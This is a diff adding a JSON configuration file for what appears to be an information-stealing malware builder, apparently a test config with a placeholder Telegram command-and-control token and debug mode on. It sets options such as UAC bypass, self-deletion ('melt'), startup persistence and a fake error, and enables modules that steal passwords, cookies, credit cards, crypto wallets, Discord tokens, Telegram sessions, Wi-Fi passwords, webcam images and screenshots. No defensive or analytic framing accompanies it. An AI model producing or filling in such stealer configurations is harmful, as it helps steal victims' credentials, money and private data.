@@ -1,0 +1,46 @@
+﻿{
+    "settings":  {
+                     "boundFileRunOnStartup":  false,
+                     "pingme":  false,
+                     "uacBypass":  false,
+                     "mutex":  "PhantomTestMutex",
+                     "archivePassword":  "test",
+                     "c2":  [
+                                "telegram",
+                                "12345:ABCDEF"
+                            ],
+                     "consoleMode":  2,
+                     "startup":  false,
+                     "melt":  false,
+                     "debug":  true,
+                     "pumpedStubSize":  0,
+                     "vmprotect":  false
+                 },
+    "modules":  {
+                    "captureScreenshot":  true,
+                    "captureSystemInfo":  true,
+                    "discordInjection":  false,
+                    "captureCreditCards":  true,
+                    "captureHistory":  true,
+                    "captureCommonFiles":  true,
+                    "captureCookies":  true,
+                    "captureWallets":  true,
+                    "captureExif":  true,
+                    "captureAutofills":  true,
+                    "captureDiscordTokens":  true,
+                    "capturePasswords":  true,
+                    "captureWifiPasswords":  true,
+                    "blockAvSites":  false,
+                    "captureGames":  true,
+                    "fakeError":  [
+                                      false,
+                                      [
+                                          "",
+                                          "",
+                                          ""
+                                      ]
+                                  ],
+                    "captureTelegramSession":  true,
+                    "captureWebcam":  true
+                }
+}
